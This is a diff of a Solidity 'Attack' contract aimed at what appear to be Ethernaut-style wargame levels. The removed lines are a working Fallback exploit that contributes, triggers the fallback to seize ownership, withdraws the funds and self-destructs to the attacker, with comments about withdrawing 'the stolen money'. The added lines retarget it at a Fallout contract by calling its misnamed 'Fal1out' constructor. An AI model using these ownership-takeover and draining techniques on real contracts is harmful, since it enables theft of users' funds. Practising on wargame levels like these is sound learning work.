@@ -1,40 +1,20 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.0;
 
-import "./Fallback.sol";
+import "./Fallout.sol";
 
-// hardhat consol log from a solidity contract
+// Does not work for the fallout attack. This was an example.
 
 contract Attack {
-    Fallback public fallbackContract;
+    Fallout public falloutContract;
     address payable owner;
 
-    constructor(address payable _fallbackAddress) {
-        fallbackContract = Fallback(_fallbackAddress);
+    constructor(address payable _falloutAddress) public {
+        falloutContract = Fallout(_falloutAddress);
         owner = payable(msg.sender);
     }
 
-    function attack() public payable {
-        // Contribue to fallback contract
-        uint256 amount1 = msg.value / 2;
-        uint256 amount2 = msg.value / 2;
-
-        fallbackContract.contribute{value: amount1}();
-
-        // send value to invoke fallback function (this allows me to becomme the owner)
-        (bool sent, ) = address(fallbackContract).call{value: amount2}("");
-        require(sent, "Failed to send eth");
-
-        // call the withdraw function.
-        fallbackContract.withdraw();
-
-        selfdestruct(owner);
+    function initializeAttack() public payable {
+        falloutContract.Fal1out.value(msg.value)();
     }
-
-    function withdraw() public {
-        // withdraw the stolen money
-        owner.transfer(address(this).balance);
-    }
-
-    receive() external payable {}
 }
